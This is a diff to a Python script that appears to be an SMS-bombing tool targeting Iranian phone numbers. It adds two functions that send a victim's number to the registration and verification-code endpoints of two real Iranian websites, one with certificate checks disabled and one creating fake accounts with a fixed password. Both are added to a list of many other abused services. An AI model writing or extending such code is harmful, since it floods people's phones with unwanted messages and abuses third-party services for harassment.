@@ -301,12 +301,36 @@ def alopeyk_safir(phone):
         return False
 
 
+def alldigitall(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://api.alldigitall.ir/v1/auth/register?store_id=0", 
+                          json={"firstname": "نام", "lastname": "خانوادگی", "mobile": phone, "password": "12345678", "password_confirmation": "12345678"}, 
+                          headers={"Origin": "https://alldigitall.ir", "Referer": "https://alldigitall.ir/"}, timeout=10)
+        print(f"[{'+' if r.status_code == 200 else '-'}] AllDigitall: {r.status_code}")
+        return r.status_code == 200
+    except: return False
+
+
+
+def activecleaners(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://uapi.activecleaners.ir/Auth/VerifyUser/GetVerifycode", 
+                          json={"mobileOrEmail": phone, "deviceCode": "ActiveClient", "firstName": "", "lastName": "", "password": ""},
+                          headers={"Content-Type": "application/json"}, timeout=10, verify=False)
+        success = r.status_code == 200 and "true" in r.text.lower()
+        print(f"[{'+' if success else '-'}] ActiveCleaners: {r.status_code}")
+        return success
+    except: return False
+
 
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno, arzplus, azkivam, arzunex, alopeyk_safir
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno, arzplus, azkivam, arzunex, alopeyk_safir, alldigitall, activecleaners
 ]
 
 # ==========================
